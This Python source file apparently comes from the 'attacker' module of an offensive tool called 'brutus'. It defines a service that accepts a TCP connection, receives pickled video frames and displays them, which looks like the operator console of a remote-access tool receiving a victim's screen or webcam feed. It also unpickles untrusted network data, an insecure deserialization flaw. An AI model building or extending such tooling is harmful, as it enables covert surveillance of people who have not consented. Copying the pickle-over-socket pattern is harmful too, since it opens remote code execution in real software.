import pickle
import struct

from brutus.attacker.service.service import Service

RECV_CHUNK = 4096
_SIZE_FMT = struct.Struct("!I")


class VideoService(Service):
    """Accept one TCP connection and display the incoming video stream."""

    def __init__(self, host: str, port: int) -> None:
        super().__init__(host, port)
        self._keyboard_listener = None

    def _start_keyboard_listener(self) -> None:
        from pynput.keyboard import Key, Listener

        def on_press(key):
            if key == Key.esc:
                self.running = False
                return False

        listener = Listener(on_press=on_press)
        listener.start()
        self._keyboard_listener = listener

    def run(self) -> None:
        import cv2

        try:
            self.setup_socket()
            self.accept_connection()
            if not self.conn:
                return

            buf = b""
            self._start_keyboard_listener()

            while self.running:
                while len(buf) < _SIZE_FMT.size and self.running:
                    chunk = self.conn.recv(RECV_CHUNK)
                    if not chunk:
                        self.running = False
                        break
                    buf += chunk

                if not self.running:
                    break

                (msg_size,) = _SIZE_FMT.unpack(buf[: _SIZE_FMT.size])
                buf = buf[_SIZE_FMT.size :]

                while len(buf) < msg_size and self.running:
                    chunk = self.conn.recv(RECV_CHUNK)
                    if not chunk:
                        self.running = False
                        break
                    buf += chunk

                if not self.running:
                    break

                frame_data = buf[:msg_size]
                buf = buf[msg_size:]

                try:
                    frame = pickle.loads(frame_data)
                except Exception:
                    continue

                cv2.imshow("Video stream (ESC to stop)", frame)
                cv2.waitKey(1)
        finally:
            try:
                import cv2 as _cv2

                _cv2.destroyAllWindows()
            except Exception:
                pass
